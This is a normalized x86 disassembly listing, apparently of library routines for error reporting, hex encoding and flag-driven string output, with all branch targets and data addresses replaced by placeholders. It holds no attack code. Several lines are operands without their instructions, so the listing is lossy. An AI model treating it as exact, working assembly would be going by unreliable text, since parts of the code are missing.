mov [ esp + 0x4 ] 0x0
jbe r-xdata
push edi
call sub_1002dc50
mov edi eax
test edi edi
mov [ esp + 0x4 ] edi
je r-xdata
push 0x7b
push r--data
push 0x41
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0xc ]
pop edi
add esp 0x18
retn
push ebx
push ebp
push esi
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov ebx eax
push edi
mov [ esp + 0x30 ] ebx
call sub_1002de70
mov esi [ esp + 0x44 ]
mov [ esp + 0x28 ] eax
push esi
call sub_1002b5d0
add esp 0x10
mov [ esp + 0x20 ] eax
test eax eax
jne r-xdata
push esi
call sub_1002cb10
mov esi eax
push esi
call sub_1002d150
mov ebp eax
add esp 0x8
test ebp ebp
mov [ esp + 0x38 ] ebp
jne r-xdata
push 0x87
push r--data
push 0x64
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x34 ]
push edi
push eax
push ecx
push 0x0
push ebp
push esi
call sub_1002db90
add esp 0x18
test eax eax
jne r-xdata
push 0x8e
jmp r-xdata
push edi
call sub_1002de00
push edi
call sub_1002dcb0
mov eax [ esp + 0x1c ]
add esp 0x8
test eax eax
pop esi
pop ebp
pop ebx
je r-xdata
push esi
call sub_1002c960
push eax
call sub_1002c960
add esp 0x8
cmp eax 0x196
push edi
jne r-xdata
push 0x94
jmp r-xdata
push r--data
push 0x41
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esp + 0x20 ]
push eax
push ebx
push ebp
push esi
call sub_1002d620
add esp 0x14
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
push edx
push ebx
push ebp
push esi
call sub_1002d5b0
add esp 0x14
test eax eax
jne r-xdata
push r--data
push 0x65
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
test ebp ebp
je r-xdata
push esi
call sub_1002cca0
add eax 0x7
push ebx
cdq
and edx 0x7
add eax edx
mov esi eax
sar esi 0x3
call sub_10029870
add eax 0x7
add esp 0x8
cdq
and edx 0x7
add eax edx
mov ebx eax
sar ebx 0x3
cmp ebx esi
jbe r-xdata
push 0xa4
push 0x9c
jmp r-xdata
push ebp
call sub_1002d200
add esp 0x4
push 0xb0
push r--data
push esi
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
push 0xad
push r--data
push 0x44
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx esi
mov edi [ esp + 0x14 ]
sub edx ebx
xor eax eax
mov ecx edx
mov ebp ecx
shr ecx 0x2
[ edi ]
mov ecx ebp
and ecx 0x3
[ edi ]
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x24 ]
add edx edi
push edx
push ecx
call sub_10029ef0
add esp 0x8
cmp ebx eax
je r-xdata
push 0xb2
mov eax [ esp + 0x3c ]
test eax eax
je r-xdata
push 0xb9
push r--data
push 0x3
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x30 ]
cmp eax esi
jbe r-xdata
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x30 ]
push edx
push ecx
push esi
push edi
call eax
add esp 0x10
test eax eax
jne r-xdata
mov edi [ esp + 0x10 ]
mov ebp [ esp + 0x38 ]
mov ecx eax
mov esi edi
mov edi [ esp + 0x2c ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ esp + 0x18 ] eax
and ecx 0x3
[ edi ] [ esi ]
mov eax esi
mov [ esp + 0x30 ] eax
mov edx [ esp + 0x30 ]
mov [ esp + 0x18 ] edx
jmp r-xdata
push 0xc1
push r--data
push 0x66
push 0x64
push 0x2b
call sub_1001de60
add esp 0x14
jmp r-xdata
sub_1005c970
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ esp + 0x10 ]
push eax
push ecx
push edx
push sub_1005c9b0
call sub_1005c9e0
add esp 0x14
retn
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_10066ef0
add esp 0xc
retn
sub_1005c9b0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push esi
push ecx
push eax
call sub_100209d0
add esp 0xc
xor edx edx
cmp eax esi
sete dl
mov eax edx
pop esi
retn
mov eax 0x1
retn
sub_1005c9e0
mov eax 0x88
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0xa0 ]
push esi
xor esi esi
push edi
cmp ebp esi
mov [ esp + 0x2c ] 0xffffffff
jge r-xdata
cmp ebp esi
mov [ esp + 0x10 ] ebp
jle r-xdata
mov [ esp + 0xa8 ] esi
mov ebp esi
mov ebx [ esp + 0xa0 ]
mov ebx [ esp + 0xa0 ]
push 0x1
push rw-data
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x40000
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x88
retn
inc esi
cmp esi ebp
jl r-xdata
mov [ esp + 0x18 ] r--data
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] ecx
mov [ esp + 0x18 ] r--data
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] ecx
mov [ esp + 0xa8 ] esi
mov ebp esi
jmp r-xdata
cmp eax 0x10000
je r-xdata
xor esi esi
jmp r-xdata
mov [ esp + 0x34 ] r--data
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x34 ] r--data
mov [ esp + 0x30 ] ecx
jmp r-xdata
test edi 0x800000
je r-xdata
mov eax 0x1
mov [ esp + 0x18 ] r--data
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] eax
mov [ esp + 0xa8 ] esi
mov ebp esi
jmp r-xdata
cmp eax 0x20000
jne r-xdata
mov edi [ esp + 0xac ]
mov ecx 0x3
mov eax edi
and eax 0xf0000
cmp eax 0x30000
ja r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn
mov ecx edi
and ecx 0x100000
dec eax
mov [ esp + 0x40 ] ecx
mov [ esp + 0x28 ] eax
mov esi [ esp + 0xa4 ]
mov eax edi
and eax 0x600000
push esi
mov [ esp + 0x48 ] eax
call sub_1005d400
add esp 0x4
mov [ esp + 0x3c ] eax
test eax eax
mov [ esp + 0x24 ] 0x0
jle r-xdata
mov [ esp + 0x18 ] r--data
mov [ esp + 0x14 ] 0x2
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] ecx
mov [ esp + 0xa8 ] esi
mov ebp esi
jmp r-xdata
mov ecx [ esp + 0x24 ]
push ecx
mov eax [ esp + 0x28 ]
push eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
push edi
mov [ esp + 0x30 ] ecx
call sub_10036740
push edi
mov esi eax
call sub_1005d810
push esi
mov [ esp + 0x44 ] eax
call sub_10022ae0
mov ebp eax
mov eax [ esp + 0x50 ]
add esp 0xc
cmp eax 0x600000
je r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
push esi
call sub_1005d490
mov edi eax
mov eax [ esp + 0x34 ]
add esp 0x8
cmp eax 0xffffffff
je r-xdata
test ebp ebp
jne r-xdata
cmp eax 0x400000
je r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push esi
push eax
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push esi
push edx
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
xor eax eax
test [ esp + 0xac ] 0x1000000
je r-xdata
push 0x1
push esi
lea edx [ esp + 0x50 ]
push 0x50
push edx
call sub_10022e40
add esp 0x10
xor esi esi
lea edx [ esp + 0x48 ]
test ebp ebp
je r-xdata
mov ecx [ esp + 0x10 ]
add ecx esi
xor esi esi
test ebp ebp
mov [ esp + 0x10 ] ecx
jle r-xdata
mov eax [ esp + 0x10 ]
add eax esi
jmp r-xdata
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x3c ]
add edi eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x10 ] edi
inc eax
dec edx
cmp eax ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] edx
jge r-xdata
mov eax 0x80
jmp r-xdata
cmp edi esi
jge r-xdata
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
add eax ebp
push 0x1
push rw-data
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x10 ] eax
mov ecx [ esp + 0x40 ]
mov ebp [ esp + 0xa8 ]
mov esi [ esp + 0xa4 ]
jmp r-xdata
mov ecx [ esp + 0xac ]
mov edx [ esp + 0x38 ]
or eax ecx
push edx
push eax
mov eax [ esp + 0xa4 ]
push ebx
push eax
call sub_1005cdf0
add esp 0x10
test eax eax
jl r-xdata
mov esi [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
push esi
push ecx
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
test [ esp + 0xac ] 0x2000000
je r-xdata
cmp eax 0x200000
jne r-xdata
push ebp
mov esi 0xa
call sub_100229a0
add esp 0x4
mov edx eax
jmp r-xdata
inc esi
cmp esi ebp
jl r-xdata
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
add edi esi
add eax edi
mov [ esp + 0x10 ] eax
sub esi edi
xor ebx ebx
test esi esi
jle r-xdata
xor esi esi
mov edx rw-data
jmp r-xdata
push ebp
mov esi 0x19
call sub_10022a40
add esp 0x4
mov edx eax
jmp r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
push edi
push edx
push ebx
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0xa0 ]
add eax esi
mov [ esp + 0x10 ] eax
mov eax [ esp + 0xa0 ]
push 0x1
push rw-data
push eax
call [ esp + 0xa8 ]
add esp 0xc
test eax eax
je r-xdata
inc ebx
cmp ebx esi
jl r-xdata
sub_1005cdf0
mov eax 0x10
call sub_1001d0d0
mov ecx [ esp + 0x1c ]
push ebx
mov ebx [ esp + 0x18 ]
mov al cl
push ebp
mov ebp [ esp + 0x28 ]
and al 0xf
push esi
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] al
mov eax [ ebp + 0x4 ]
push edi
test cl 0x40
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x30 ] 0x0
je r-xdata
test cl 0x80
jne r-xdata
push eax
call sub_10066ff0
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
push edi
push edx
push esi
call ebx
add esp 0x10
test eax eax
je r-xdata
push 0x1
push r--data
push esi
call ebx
add esp 0xc
test eax eax
je r-xdata
test cl 0x20
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
push 0x1
push rw-data
push esi
call ebx
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x2c ]
test ah 0x2
jne r-xdata
mov edi 0x1
test eax eax
jle r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x18 ]
inc edi
mov [ esp + 0x30 ] edi
mov edx [ ebp + 0x4 ]
lea eax [ esp + 0x18 ]
push 0x0
push eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] ebp
call sub_1002f050
push 0x10d
push r--data
push eax
mov [ esp + 0x3c ] eax
call sub_1001d4c0
mov edi eax
add esp 0x14
test edi edi
je r-xdata
mov eax [ ebp ]
mov ebp [ ebp + 0x8 ]
test esi esi
mov [ esp + 0x28 ] eax
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ ebp ]
push 0x0
lea edx [ esp + 0x17 ]
push ebx
push edx
mov edx [ ebp + 0x8 ]
push eax
push edi
push ecx
push edx
call sub_1005d0e0
add esp 0x1c
test eax eax
jge r-xdata
test edi edi
jne r-xdata
test ch 0x1
je r-xdata
cmp eax 0x1f
jge r-xdata
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x2c ] edi
call sub_1002f050
add esp 0x8
test esi esi
je r-xdata
add eax eax
test eax eax
jl r-xdata
lea edi [ eax + ebp ]
cmp ebp edi
je r-xdata
mov edx [ esp + 0x30 ]
add edx eax
mov al [ esp + 0x13 ]
test al al
mov [ esp + 0x30 ] edx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
or edi 0x8
mov edi 0x1
jmp r-xdata
movsx edi [ eax + r--data ]
cmp edi 0xffffffff
jne r-xdata
mov eax [ esp + 0x28 ]
lea esi [ eax + eax ]
mov eax [ esp + 0x28 ]
mov ebp edi
add eax edi
cmp edi eax
je r-xdata
inc eax
jmp r-xdata
xor eax eax
push 0x2
mov al [ ebp ]
mov ecx eax
and eax 0xf
shr ecx 0x4
mov al [ eax + r--data ]
mov dl [ ecx + r--data ]
lea ecx [ esp + 0x30 ]
push ecx
push esi
mov [ esp + 0x38 ] dl
mov [ esp + 0x39 ] al
call ebx
add esp 0xc
test eax eax
je r-xdata
test esi esi
je r-xdata
mov ecx edx
add ecx 0x2
mov [ esp + 0x30 ] ecx
test cl 0x10
je r-xdata
lea eax [ esi + 0x1 ]
xor eax eax
push 0x2
mov al [ ebp ]
mov ecx eax
and eax 0xf
shr ecx 0x4
mov al [ eax + r--data ]
mov dl [ ecx + r--data ]
lea ecx [ esp + 0x30 ]
push ecx
push esi
mov [ esp + 0x38 ] dl
mov [ esp + 0x39 ] al
call ebx
add esp 0xc
test eax eax
je r-xdata
test eax eax
jge r-xdata
inc ebp
cmp ebp edi
jne r-xdata
mov eax [ esp + 0x30 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
test al al
je r-xdata
mov ecx [ esp + 0x30 ]
pop edi
pop esi
pop ebp
add eax ecx
pop ebx
add esp 0x10
retn
or esi 0xffffffff
jmp r-xdata
mov edx [ esp + 0x28 ]
inc ebp
lea eax [ edi + edx ]
cmp ebp eax
jne r-xdata
mov eax [ esp + 0x28 ]
mov eax [ esp + 0x14 ]
mov ecx [ ebp ]
mov edx [ ebp + 0x8 ]
push esi
push ebx
push 0x0
push eax
push edi
push ecx
push edx
call sub_1005d0e0
add esp 0x1c
test eax eax
jge r-xdata
push 0x1
push r--data
push esi
call ebx
add esp 0xc
test eax eax
jne r-xdata
push edi
call sub_1001d740
add esp 0x4
test esi esi
jl r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
push 0x1
push r--data
push esi
call ebx
add esp 0xc
test eax eax
jne r-xdata
sub_1005d0e0
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
push ebx
push ebp
push esi
lea esi [ eax + ecx ]
push edi
cmp eax esi
mov edi eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov ebp [ esp + 0x34 ]
and ebp 0x7
mov [ esp + 0x1c ] ebp
jmp r-xdata
cmp edi eax
jne r-xdata
xor bl bl
test [ esp + 0x38 ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x18
retn
jmp [ ebp * 4 + jump_table_1005d274 ]
mov bl 0x20
jmp r-xdata
xor eax eax
xor edx edx
mov al [ edi ]
xor ecx ecx
shl eax 0x18
inc edi
mov [ esp + 0x10 ] eax
mov dl [ edi ]
shl edx 0x10
or eax edx
inc edi
mov [ esp + 0x10 ] eax
xor edx edx
mov ch [ edi ]
or eax ecx
inc edi
mov [ esp + 0x10 ] eax
mov dl [ edi ]
or eax edx
inc edi
mov [ esp + 0x10 ] eax
jmp r-xdata
xor eax eax
xor ecx ecx
mov ah [ edi ]
inc edi
mov [ esp + 0x10 ] eax
mov cl [ edi ]
or eax ecx
inc edi
mov [ esp + 0x10 ] eax
jmp r-xdata
xor eax eax
mov al [ edi ]
inc edi
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp + 0x30 ]
lea edx [ esp + 0x10 ]
push edx
push eax
push edi
call sub_10067020
add esp 0xc
test eax eax
jl r-xdata
cmp ebp 0x4
ja r-xdata
cmp edi esi
jne r-xdata
add edi eax
mov eax [ esp + 0x10 ]
test [ esp + 0x34 ] 0x8
je r-xdata
test [ esp + 0x38 ] 0x1
je r-xdata
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x40 ]
push edx
mov dl [ esp + 0x40 ]
or bl dl
push ecx
push ebx
push eax
call sub_1005d290
add esp 0x14
test eax eax
jl r-xdata
push eax
lea ecx [ esp + 0x24 ]
push 0x6
push ecx
call sub_100672f0
mov ebp eax
add esp 0xc
xor esi esi
test ebp ebp
jle r-xdata
mov bl 0x40
add [ esp + 0x14 ] eax
jmp r-xdata
mov esi [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
or bl [ esp + 0x38 ]
cmp edi esi
jne r-xdata
mov eax [ esp + 0x2c ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov edx [ esp + 0x14 ]
add edx eax
inc esi
cmp esi ebp
mov [ esp + 0x14 ] edx
jl r-xdata
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
push edx
xor edx edx
push eax
mov dl [ esp + esi + 0x28 ]
push ecx
push ebx
push edx
call sub_1005d290
add esp 0x14
test eax eax
jl r-xdata
sub_1005d290
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x10 ]
push esi
cmp eax 0xffffffff
push edi
jbe r-xdata
cmp eax 0xffff
jbe r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0xc
retn
cmp eax 0xff
jbe r-xdata
push eax
push r--data
lea eax [ esp + 0x10 ]
push 0xb
push eax
call sub_100279b0
mov edx [ esp + 0x38 ]
lea ecx [ esp + 0x18 ]
push 0xa
push ecx
push edx
call [ esp + 0x40 ]
add esp 0x1c
neg eax
sbb eax eax
pop edi
and eax 0xb
pop esi
dec eax
add esp 0xc
retn
cmp al 0x7f
mov [ esp + 0x18 ] al
jbe r-xdata
push eax
push r--data
lea eax [ esp + 0x10 ]
push 0xb
push eax
call sub_100279b0
mov edx [ esp + 0x38 ]
lea ecx [ esp + 0x18 ]
push 0x6
push ecx
push edx
call [ esp + 0x40 ]
add esp 0x1c
neg eax
sbb eax eax
pop edi
and eax 0x7
pop esi
dec eax
add esp 0xc
retn
mov dl [ esp + 0x1c ]
mov ecx eax
and ecx 0xff
mov cl [ ecx + rw-data ]
and cl dl
mov cl [ esp + 0x1c ]
and cl 0x4
jmp r-xdata
test cl 0x6
je r-xdata
test cl 0x8
je r-xdata
test cl 0x61
je r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x18 ]
push 0x1
push edx
push eax
call [ esp + 0x30 ]
add esp 0xc
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
dec eax
add esp 0xc
retn
and eax 0xff
lea edx [ esp + 0x8 ]
push eax
push r--data
push 0xb
push edx
call sub_100279b0
mov ecx [ esp + 0x38 ]
lea eax [ esp + 0x18 ]
push 0x3
push eax
push ecx
call [ esp + 0x40 ]
add esp 0x1c
neg eax
sbb eax eax
pop edi
and eax 0x4
pop esi
dec eax
add esp 0xc
retn
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
push 0x1
push rw-data
push esi
call edi
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
push 0x1
push ecx
push esi
call edi
add esp 0xc
neg eax
sbb eax eax
pop edi
and eax 0x3
pop esi
dec eax
add esp 0xc
retn
pop edi
or eax 0xffffffff
pop esi
add esp 0xc
retn
mov [ eax ] 0x1
sub_1005d420
mov eax [ esp + 0x8 ]
push ebp
push eax
call sub_10022900
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov eax [ esp + 0x8 ]
push ebx
push esi
mov esi [ esp + 0x18 ]
test eax eax
push edi
je r-xdata
mov eax 0xfffffffe
pop ebp
retn
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
test esi esi
jge r-xdata
mov edi [ eax ]
push edi
call sub_1001e7b0
add esp 0x4
mov ebx eax
inc esi
cmp esi ebx
jge r-xdata
or esi 0xffffffff
push esi
push edi
call sub_1001e7c0
mov ecx [ eax ]
push ebp
push ecx
call sub_10030b10
add esp 0x10
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi ebx
jl r-xdata
sub_1005d490
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push eax
call sub_1001e7b0
mov ecx [ esp + 0x10 ]
add esp 0x4
cmp eax ecx
jle r-xdata
test ecx ecx
jl r-xdata
push ecx
mov ecx [ esi ]
push ecx
call sub_1001e7c0
add esp 0x8
pop esi
retn
sub_1005d4d0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ ebp ]
push eax
call sub_1001e7b0
mov esi [ esp + 0x1c ]
add esp 0x4
cmp eax esi
jle r-xdata
test esi esi
jl r-xdata
mov edi [ ebp ]
push esi
push edi
call sub_1001e5d0
push edi
mov [ esp + 0x20 ] eax
call sub_1001e7b0
mov ebx eax
add esp 0xc
cmp esi ebx
mov [ ebp + 0x4 ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x14 ]
mov ebp [ edx + 0x8 ]
dec ebp
lea ecx [ esi - 0x1 ]
push ecx
push edi
call sub_1001e7c0
mov ebp [ eax + 0x8 ]
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn
cmp esi ebx
jge r-xdata
push esi
push edi
call sub_1001e7c0
mov ecx [ eax + 0x8 ]
add esp 0x8
inc ebp
cmp ebp ecx
jge r-xdata
push esi
push edi
call sub_1001e7c0
mov edx [ eax + 0x8 ]
add eax 0x8
add esp 0x8
dec edx
inc esi
mov [ eax ] edx
cmp esi ebx
jl r-xdata
sub_1005d590
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push 0x0
push esi
call sub_10022b70
mov ebp eax
add esp 0x8
test ebp ebp
mov [ esp + 0x14 ] ebp
jne r-xdata
push ebx
call sub_10020150
mov esi eax
test esi esi
je r-xdata
push 0x11d
push r--data
push 0x77
push 0x83
push 0xb
call sub_1001de60
push esi
push r--data
push 0x2
call sub_1001e1a0
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
retn
push ebp
call sub_10030910
add esp 0x4
test esi esi
pop ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_10030910
push ebp
call sub_10030980
add esp 0x8
xor ecx ecx
test eax eax
setne cl
test ecx ecx
mov [ esi ] eax
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
push eax
push ecx
push esi
push edx
call sub_1005d6e0
push esi
mov edi eax
call sub_10020160
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebp
retn
push esi
call sub_10020160
add esp 0x4
xor esi esi
jmp r-xdata
mov ebx [ esp + 0x20 ]
mov edi [ esp + 0x24 ]
test ebx ebx
jne r-xdata
mov ebp [ esp + 0x1c ]
test ebp ebp
jle r-xdata
test edi edi
jne r-xdata
test edi edi
jge r-xdata
test ebp 0x1000
je r-xdata
mov edx [ esi + 0x4 ]
push edi
push ebx
push edx
call sub_1002ec90
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
push eax
call sub_10022ae0
push eax
push ebp
push edi
lea ecx [ esi + 0x4 ]
push ebx
push ecx
call sub_10066c00
add esp 0x18
neg eax
sbb eax eax
neg eax
test eax eax
jne r-xdata
mov ebp [ esp + 0x18 ]
cmp ebp 0xffffffff
je r-xdata
mov ebp [ esp + 0x18 ]
cmp ebp 0xfffffffe
jne r-xdata
mov edx [ esi + 0x4 ]
mov [ edx + 0x4 ] ebp
jmp r-xdata
push edi
push ebx
call sub_10067b30
mov ecx [ esi + 0x4 ]
add esp 0x8
mov [ ecx + 0x4 ] eax
sub_1005d6e0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
jne r-xdata
mov ebx [ esi ]
push ebx
call sub_1001e7b0
mov edi [ esp + 0x20 ]
add esp 0x4
cmp edi eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi eax
test edi edi
jge r-xdata
cmp edi eax
jl r-xdata
test edi edi
jne r-xdata
mov edx [ esp + 0x20 ]
mov ecx 0x1
cmp edx 0xffffffff
mov [ esi + 0x4 ] ecx
jne r-xdata
push edi
push ebx
call sub_1001e7c0
mov esi [ eax + 0x8 ]
add esp 0x8
test edi edi
je r-xdata
lea eax [ edi - 0x1 ]
push eax
push ebx
call sub_1001e7c0
mov esi [ eax + 0x8 ]
add esp 0x8
mov [ esp + 0x14 ] 0x0
jmp r-xdata
xor esi esi
mov [ esp + 0x14 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push edi
push ebp
push ebx
mov [ ebp + 0x8 ] esi
call sub_1001e4c0
add esp 0xc
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
lea ecx [ edi - 0x1 ]
push ecx
push ebx
call sub_1001e7c0
mov esi [ eax + 0x8 ]
add esp 0x8
inc esi
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_10020180
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x103
push r--data
push 0x41
push 0x71
push 0xb
call sub_1001de60
push ebp
call sub_10020160
add esp 0x18
xor edx edx
test esi esi
sete dl
mov [ esp + 0x14 ] edx
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push ebx
call sub_1001e7b0
lea ecx [ edi + 0x1 ]
add esp 0x4
cmp ecx eax
jge r-xdata
sub eax ecx
lea esi [ ecx - 0x1 ]
mov edi eax
push esi
push ebx
call sub_1001e7c0
mov edx [ eax + 0x8 ]
add eax 0x8
add esp 0x8
inc edx
inc esi
dec edi
mov [ eax ] edx
jne r-xdata
sub_1005d820
mov eax 0x1e0
call sub_1001d0d0
mov ecx [ esp + 0x1e4 ]
push ebx
push ebp
push esi
lea eax [ esp + 0x44 ]
push edi
push eax
push sub_1005dc30
push 0x1
xor ebx ebx
or esi 0xffffffff
push 0x2c
push ecx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x5c ] esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x68 ] 0x1
mov [ esp + 0x200 ] ebx
call sub_10061130
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x50 ]
cmp edi 0x10
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1e0
retn
cmp [ esp + 0x1f8 ] ebx
jne r-xdata
cmp edi 0x11
je r-xdata
mov ebp [ esp + 0x58 ]
mov [ esp + 0x14 ] ebx
xor esi esi
call sub_1001e3c0
test ebp ebp
mov [ esp + 0x18 ] eax
je r-xdata
push 0xa3
push r--data
push 0xc0
push 0xb2
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1e0
retn
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
push edi
push edx
push eax
call sub_1005e130
add esp 0xc
mov edi eax
jmp r-xdata
xor edx edx
cmp edi 0x11
mov eax [ esp + 0x18 ]
sete dl
mov ebp edx
push ebp
push 0x0
push edi
push sub_1002f050
push 0x0
push eax
call sub_10050220
push 0x1dc
push r--data
push eax
mov [ esp + 0x5c ] eax
call sub_1001d4c0
mov edx [ esp + 0x3c ]
push ebp
push 0x0
push edi
lea ecx [ esp + 0x6c ]
push sub_1002f050
push ecx
push edx
mov [ esp + 0x6c ] eax
mov [ esp + 0x78 ] eax
call sub_10050220
add esp 0x3c
call sub_1002f070
mov ebp eax
test ebp ebp
mov [ esp + 0x14 ] ebp
je r-xdata
mov ecx [ esp + 0x1f8 ]
push ebp
push ecx
call sub_1005e650
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
